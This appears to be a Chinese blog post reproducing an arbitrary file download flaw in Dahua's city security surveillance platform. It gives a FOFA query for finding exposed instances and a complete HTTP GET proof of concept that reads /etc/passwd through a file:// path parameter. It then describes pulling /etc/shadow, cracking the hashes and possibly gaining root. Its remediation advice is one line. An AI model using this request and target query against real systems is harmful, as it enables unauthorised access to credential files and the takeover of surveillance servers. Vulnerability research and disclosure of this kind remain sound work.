# 原创
：  漏洞复现--大华城市安防系统平台任意文件下载（poc）

# 漏洞复现--大华城市安防系统平台任意文件下载（poc）

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**

### 一：漏洞描述

大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件。

### 二:漏洞影响版本

-大华城市安防系统

### 三：网络空间测绘查询

fofa语句：

```
app="dahua-DSS"

```

### 四：漏洞复现

POC:

```
GET /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9a02ac66b965d560caee1d2fe717752a.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5d46b6481f3f2e6d0e005e6533fd6330.jpeg"/><br/> 成功读取etc/passwd

### 五：漏洞利用

用户密码存放在etc/shadow下，读取etc/shadow<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/afb2a2910eb2fc9f667390f0006bb395.jpeg"/><br/> 拿去cmd解密<br/> guest<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5f192118fa4b07c1ea4d54e6494b7acb.jpeg"/><br/> ftp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9613b6aba514c38b44dec620c222bc06.jpeg"/><br/> 运气好的话能直接破解root密码，点到为止，拿到密码后可以干什么懂得都懂，这里也是不演示了

### 六：修复方案

自行查询厂商发布补丁
